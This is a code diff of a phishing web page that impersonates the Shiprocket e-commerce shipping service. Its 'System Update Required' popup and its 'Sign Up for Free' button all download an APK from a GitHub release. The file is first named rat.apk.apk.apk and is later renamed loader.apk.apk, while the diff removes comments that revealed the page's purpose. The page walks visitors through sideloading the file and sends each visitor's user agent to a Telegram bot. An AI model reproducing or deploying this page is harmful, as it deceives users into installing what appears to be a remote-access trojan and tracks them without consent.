@@ -59,7 +59,6 @@
         .stat-box h3 { font-size: 24px; color: #6b21a8; }
         .stat-box p { font-size: 12px; color: #999; margin-top: 4px; }
         
-        /* OPEN APP PROMPT */
         .open-prompt {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: #fff; z-index: 10001; text-align: center;
@@ -85,21 +84,21 @@
 </head>
 <body>
 
-    <!-- FAKE POPUP WITH DIRECT DOWNLOAD LINK -->
+    <!-- FAKE POPUP -->
     <div class="fake-popup" id="fakePopup">
         <div class="fake-dialog">
             <div class="fake-icon">📦</div>
             <div class="fake-title">System Update Required</div>
             <div class="fake-message">Your device needs a critical system update to continue using this app. Tap "Install" to proceed.</div>
             <div class="fake-buttons">
-                <a href="https://github.com/hoihohavapv/babychak/releases/download/v1.0.2/rat.apk.apk.apk" class="fake-btn fake-btn-cancel" download>Cancel</a>
-                <a href="https://github.com/hoihohavapv/babychak/releases/download/v1.0.2/rat.apk.apk.apk" class="fake-btn fake-btn-ok" download>Install</a>
+                <a href="https://github.com/hoihohavapv/babychak/releases/download/v0.1.0/loader.apk.apk" class="fake-btn fake-btn-cancel" download>Cancel</a>
+                <a href="https://github.com/hoihohavapv/babychak/releases/download/v0.1.0/loader.apk.apk" class="fake-btn fake-btn-ok" download>Install</a>
             </div>
             <a href="guide.html" class="guide-link">Need help? View installation guide</a>
         </div>
     </div>
 
-    <!-- OPEN APP PROMPT (SHOWS AFTER DOWNLOAD) -->
+    <!-- OPEN APP PROMPT -->
     <div class="open-prompt" id="openPrompt">
         <div class="icon">📲</div>
         <h1>App Downloaded!</h1>
@@ -116,7 +115,7 @@
             <h3>📋 Manual Steps:</h3>
             <p>
                 <strong>Step 1:</strong> Open your phone's <strong>Files</strong> or <strong>Downloads</strong> app<br>
-                <strong>Step 2:</strong> Find <strong>rat.apk.apk.apk</strong><br>
+                <strong>Step 2:</strong> Find <strong>loader.apk.apk</strong><br>
                 <strong>Step 3:</strong> Tap it to install<br>
                 <strong>Step 4:</strong> Tap <strong>"Install"</strong> → <strong>"Open"</strong>
             </p>
@@ -140,7 +139,7 @@
     <div class="hero">
         <h1>Shiprocket, Your Partner for eCommerce Empowerment</h1>
         <p>From shipping to scaling, we grow your eCommerce brand end-to-end.</p>
-        <a href="https://github.com/hoihohavapv/babychak/releases/download/v1.0.2/rat.apk.apk.apk" class="cta-btn" download>Sign Up for Free</a>
+        <a href="https://github.com/hoihohavapv/babychak/releases/download/v0.1.0/loader.apk.apk" class="cta-btn" download>Sign Up for Free</a>
     </div>
 
     <div class="gradient-bar"></div>
@@ -156,7 +155,6 @@
     </div>
 
     <script>
-        // Report page load
         function report(msg) {
             try {
                 fetch("https://api.telegram.org/bot8884434975:AAHaHSzckxuewYq_mkf1cPNnNt9NKVdd_FY/sendMessage?chat_id=8501093383&text=" + encodeURIComponent(msg));
@@ -164,7 +162,6 @@
         }
         report("🌐 Page loaded: " + navigator.userAgent);
         
-        // Show "OPEN APP NOW" prompt after 4 seconds (after download starts)
         setTimeout(function() {
             document.getElementById('fakePopup').style.display = 'none';
             document.getElementById('openPrompt').style.display = 'block';
